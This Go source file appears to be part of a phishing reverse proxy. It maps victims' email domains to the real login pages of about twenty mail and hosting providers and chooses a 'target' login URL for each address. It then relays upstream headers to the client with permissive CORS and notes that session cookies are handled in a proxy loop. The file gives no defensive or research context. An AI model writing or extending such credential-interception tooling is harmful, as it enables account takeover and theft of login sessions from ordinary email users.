package main

import (
	"net/http"
	"strings"
)

// ProviderMapping maps email domains to their actual login URLs
var ProviderMapping = map[string]string{
	"gmail.com":      "https://accounts.google.com/",
	"google.com":     "https://accounts.google.com/",
	"outlook.com":    "https://login.live.com/",
	"hotmail.com":    "https://login.live.com/",
	"live.com":       "https://login.live.com/",
	"yahoo.com":      "https://login.yahoo.com/",
	"icloud.com":     "https://appleid.apple.com/",
	"aol.com":        "https://login.aol.com/",
	"protonmail.com": "https://account.proton.me/",
	"zoho.com":       "https://accounts.zoho.com/",
	"yandex.com":     "https://passport.yandex.com/",
	"qq.com":         "https://mail.qq.com/",
	"163.com":        "https://mail.163.com/",
	"126.com":        "https://mail.126.com/",
	"foxmail.com":    "https://mail.qq.com/",
	"web.de":         "https://web.de/mam/login.action",
	"gmx.com":        "https://login.gmx.net",
	"tutanota.com":   "https://login.tutanota.com/",
	"fastmail.com":   "https://www.fastmail.com/auth/login",
	"godaddy.com":    "https://sso.godaddy.com/",
	"cpanel.net":     "https://cpanel.net/",
}

// GetTargetDomain determines the real login URL based on the email domain
func GetTargetDomain(email string) string {
	parts := strings.Split(email, "@")
	if len(parts) < 2 {
		return "https://accounts.google.com/" // Default fallback
	}
	domain := strings.ToLower(parts[1])
	if target, ok := ProviderMapping[domain]; ok {
		return target
	}
	// Fallback: assume it's a standard webmail (good for cPanel / custom domains)
	return "https://webmail." + domain + "/"
}

// CloneHeaders copies critical headers from the upstream response to the client
func CloneHeaders(src *http.Response, dst http.ResponseWriter) {
	dst.Header().Set("Content-Type", src.Header.Get("Content-Type"))
	dst.Header().Set("Cache-Control", "no-cache, no-store, must-revalidate")
	dst.Header().Set("Access-Control-Allow-Origin", "*") // Allows JS to load resources
	// Note: Set-Cookie is handled in the proxy loop
}
